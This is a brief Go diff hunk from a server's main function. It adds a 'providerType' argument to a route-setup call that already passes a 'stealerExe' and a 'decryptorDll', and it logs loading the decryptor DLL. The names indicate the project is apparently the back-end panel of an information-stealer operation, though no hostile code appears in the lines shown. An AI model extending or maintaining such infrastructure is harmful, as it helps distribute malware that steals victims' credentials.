@@ -236,8 +236,7 @@ func main() {
 		slog.Info("loaded decryptor DLL", "path", decryptorPath, "size", len(decryptorDll))
 	}
 
-	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub, stealerExe, decryptorDll)
-
+	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub, stealerExe, decryptorDll, providerType)
 	distFS, err := fs.Sub(frontendFS, "frontend/dist")
 	if err != nil {
 		slog.Error("failed to resolve frontend filesystem", "err", err)
